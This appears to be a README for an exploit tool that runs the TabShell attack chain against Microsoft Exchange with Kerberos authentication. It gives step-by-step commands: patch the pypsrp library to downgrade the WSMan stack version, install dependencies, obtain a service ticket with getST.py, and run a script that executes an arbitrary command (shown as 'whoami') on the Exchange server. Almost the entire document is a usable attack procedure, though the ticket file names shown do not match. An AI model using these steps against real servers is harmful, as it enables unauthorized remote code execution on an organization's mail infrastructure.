
# Tabshell exploit with Kerberos authentication
- Adapted from [The OWASSRF + TabShell exploit chain](https://blog.viettelcybersecurity.com/tabshell-owassrf/)


- First, patch the `pyprsp` module to enable `WSManStackVersion` downgrading, and install the dependencies 
```
$ git clone https://github.com/jborean93/pypsrp
$ patch -p0 < pyprsp.patch
patching file pypsrp/src/pypsrp/complex_objects.py
patching file pypsrp/src/pypsrp/powershell.py
patching file pypsrp/src/pypsrp/serializer.py
patching file pypsrp/src/pypsrp/wsman.py

$ virtualenv venv
$ . ./venv/bin/activate
$ pip install ./pypsrp impacket termcolor gssapi krb5
```



- Then, ask for a service ticket for the HTTP service class for a vulnerable Exchange, then pass it to the final script :
```
$ getST.py -spn HTTP/EXCHANGE.CORP.LOCAL -k -no-pass  'CORP/Admin:Password'
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Getting ST for user
[*] Saving ticket in Administrator.ccache

$ KRB5CCNAME=Admin.ccache  python3 krb_tabshell_exec_cmd.py -spn HTTP/EXCHANGE.CORP.LOCAL -url http://EXCHANGE.CORP.LOCAL -cmd whoami
[...]
```